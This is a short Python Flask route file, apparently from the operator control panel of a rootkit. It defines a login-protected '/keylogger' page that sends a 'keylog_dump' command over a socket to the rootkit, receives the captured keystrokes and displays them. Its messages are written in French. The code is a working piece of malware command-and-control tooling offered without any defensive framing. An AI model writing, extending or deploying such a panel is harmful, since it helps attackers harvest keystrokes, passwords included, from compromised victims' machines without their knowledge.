from app import app
import config as cfg
from flask import render_template, redirect, url_for, session

# -------------------------------- KEYLOGGER -------------------------------- #

@app.route('/keylogger')
def keylogger():
    if not session.get('authenticated'):
        return redirect(url_for('login'))
    try:
        with cfg.connection_lock:
            if cfg.rootkit_connection:
                cfg.rootkit_connection.sendall(b"keylog_dump\n")
                cfg.rootkit_connection.settimeout(2)
                data = cfg.rootkit_connection.recv(cfg.BUFFER_SIZE).decode()
                cfg.rootkit_connection.settimeout(None)
                keylog_data = data.strip()
            else:
                keylog_data = "Aucune connexion au rootkit."
    except Exception as e:
        keylog_data = f"Erreur : {e}"

    return render_template("keylogger.html", keylog_data=keylog_data)
